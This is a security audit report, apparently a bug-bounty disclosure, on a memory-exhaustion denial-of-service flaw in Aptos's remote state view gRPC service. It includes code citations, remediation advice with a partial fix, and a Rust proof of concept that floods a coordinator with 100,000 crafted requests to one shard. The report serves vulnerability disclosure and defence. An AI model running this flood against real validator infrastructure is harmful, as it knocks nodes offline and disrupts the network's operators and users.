# Audit Report

## Title
Unbounded Channel Memory Exhaustion via Targeted Shard Flooding in Remote State View Service

## Summary
An unauthenticated attacker can flood the coordinator node with `RemoteKVRequest` messages targeting a single `shard_id`, causing unbounded memory growth in that shard's outbound channel. This leads to memory exhaustion on the coordinator and denial of service for the distributed execution system.

## Finding Description

The `RemoteStateViewService` handles key-value requests from remote executor shards via gRPC. The vulnerability exists in the combination of three design issues:

1. **Unbounded Channels**: All outbound response channels are created as unbounded crossbeam channels [1](#0-0) 

2. **No Authentication**: The gRPC endpoint accepts messages from any client without authentication [2](#0-1) 

3. **Attacker-Controlled shard_id**: The `shard_id` field in `RemoteKVRequest` is directly deserialized from the network message and used as an array index without validation [3](#0-2) 

**Attack Flow:**

1. Attacker establishes gRPC connection to the coordinator's `RemoteStateViewService` endpoint
2. Floods the service with crafted `RemoteKVRequest` messages, all claiming to be from `shard_id=0`
3. Each request is processed concurrently by the thread pool [4](#0-3) 
4. Each response is sent to the unbounded channel `kv_tx[0]` [5](#0-4) 
5. The single-threaded outbound handler processes messages sequentially from all channels using `Select` [6](#0-5) 
6. Responses accumulate faster than the outbound handler can process them, causing unbounded memory growth
7. Memory exhaustion on coordinator node, DoS for all executor shards

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Impact Explanation

This vulnerability qualifies as **Medium Severity** per the Aptos bug bounty criteria:

- **Validator node slowdowns**: The coordinator node experiences memory exhaustion and degraded performance
- **State inconsistencies requiring intervention**: The distributed execution system cannot complete block execution, requiring manual intervention to restart

The attack does not directly lead to consensus violations or fund loss, but severely degrades validator availability by making the sharded block executor unusable. In production deployments using remote execution, this would force validators to fall back to single-threaded execution or go offline.

## Likelihood Explanation

**Likelihood: High**

- **Attacker Requirements**: Only needs network access to the coordinator's gRPC endpoint (default port exposed for shard communication)
- **Complexity**: Low - simple gRPC client can flood messages
- **Detection Difficulty**: Difficult to distinguish from legitimate shard traffic initially
- **Attack Surface**: All deployments using `RemoteExecutorClient` are vulnerable [7](#0-6) 

The attack is trivial to execute and the service has no built-in protections against flooding.

## Recommendation

Implement multiple defense layers:

1. **Add Authentication**: Require mutual TLS or authentication tokens for gRPC connections
2. **Use Bounded Channels**: Replace unbounded channels with bounded channels (e.g., capacity 1000) and implement backpressure
3. **Validate shard_id**: Check `shard_id < kv_tx.len()` before array access
4. **Rate Limiting**: Implement per-shard rate limits on incoming requests
5. **Monitoring**: Add metrics for channel queue depths and alert on anomalies

**Code Fix Example** (partial):

```rust
// In remote_state_view_service.rs handle_message():
pub fn handle_message(
    message: Message,
    state_view: Arc<RwLock<Option<Arc<S>>>>,
    kv_tx: Arc<Vec<Sender<Message>>>,
) {
    // ... existing deserialization code ...
    
    let (shard_id, state_keys) = req.into();
    
    // Validate shard_id
    if shard_id >= kv_tx.len() {
        warn!("Invalid shard_id {} received, max is {}", shard_id, kv_tx.len());
        return;
    }
    
    // ... rest of function ...
    
    // Use try_send() to detect full channels
    if let Err(e) = kv_tx[shard_id].try_send(message) {
        warn!("Failed to send to shard {}: {:?}", shard_id, e);
        // Implement backpressure or drop old messages
    }
}
```

## Proof of Concept

```rust
// PoC: Flood coordinator with requests to shard 0
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use tonic::Request;

#[tokio::main]
async fn main() {
    let coordinator_addr = "http://127.0.0.1:8080"; // Coordinator gRPC endpoint
    let mut client = NetworkMessageServiceClient::connect(coordinator_addr)
        .await
        .unwrap();
    
    // Craft RemoteKVRequest with shard_id=0
    let malicious_request = RemoteKVRequest {
        shard_id: 0,
        keys: vec![StateKey::raw(b"dummy_key".to_vec())],
    };
    
    let request_bytes = bcs::to_bytes(&malicious_request).unwrap();
    
    // Flood with 100,000 requests
    for i in 0..100_000 {
        let network_msg = NetworkMessage {
            message: request_bytes.clone(),
            message_type: "remote_kv_request".to_string(),
        };
        
        let request = Request::new(network_msg);
        client.simple_msg_exchange(request).await.unwrap();
        
        if i % 1000 == 0 {
            println!("Sent {} requests", i);
        }
    }
    
    // Monitor coordinator memory - should grow unbounded
    // kv_tx[0] channel accumulates 100k responses in memory
}
```

**Notes**

This vulnerability affects the distributed execution architecture specifically. The lack of authentication, combined with unbounded channels and sequential outbound processing, creates a perfect storm for resource exhaustion attacks. While the premise of the security question suggested the channel might "block," the actual issue is worse: unbounded channels never block on send, allowing unlimited memory consumption until OOM kill.

### Citations

**File:** secure/net/src/network_controller/mod.rs (L120-120)
```rust
        let (outbound_sender, outbound_receiver) = unbounded();
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** execution/executor-service/src/remote_state_view_service.rs (L68-71)
```rust
            self.thread_pool.spawn(move || {
                Self::handle_message(message, state_view, kv_txs);
            });
        }
```

**File:** execution/executor-service/src/remote_state_view_service.rs (L86-89)
```rust
        let req: RemoteKVRequest = bcs::from_bytes(&message.data).unwrap();
        drop(bcs_deser_timer);

        let (shard_id, state_keys) = req.into();
```

**File:** execution/executor-service/src/remote_state_view_service.rs (L121-121)
```rust
        kv_tx[shard_id].send(message).unwrap();
```

**File:** secure/net/src/network_controller/outbound_handler.rs (L109-161)
```rust
        loop {
            let mut select = Select::new();
            for (receiver, _, _) in outbound_handlers.iter() {
                select.recv(receiver);
            }

            let index;
            let msg;
            let _timer;
            {
                let oper = select.select();
                _timer = NETWORK_HANDLER_TIMER
                    .with_label_values(&[&socket_addr.to_string(), "outbound_msgs"])
                    .start_timer();
                index = oper.index();
                match oper.recv(&outbound_handlers[index].0) {
                    Ok(m) => {
                        msg = m;
                    },
                    Err(e) => {
                        warn!(
                            "{:?} for outbound handler on {:?}. This can happen in shutdown,\
                             but should not happen otherwise",
                            e.to_string(),
                            socket_addr
                        );
                        return;
                    },
                }
            }

            let remote_addr = &outbound_handlers[index].1;
            let message_type = &outbound_handlers[index].2;

            if message_type.get_type() == "stop_task" {
                return;
            }

            if remote_addr == socket_addr {
                // If the remote address is the same as the local address, then we are sending a message to ourselves
                // so we should just pass it to the inbound handler
                inbound_handler
                    .lock()
                    .unwrap()
                    .send_incoming_message_to_handler(message_type, msg);
            } else {
                grpc_clients
                    .get_mut(remote_addr)
                    .unwrap()
                    .send_message(*socket_addr, msg, message_type)
                    .await;
            }
        }
```

**File:** execution/executor-service/src/remote_executor_client.rs (L121-125)
```rust
        let state_view_service = Arc::new(RemoteStateViewService::new(
            controller_mut_ref,
            remote_shard_addresses,
            None,
        ));
```
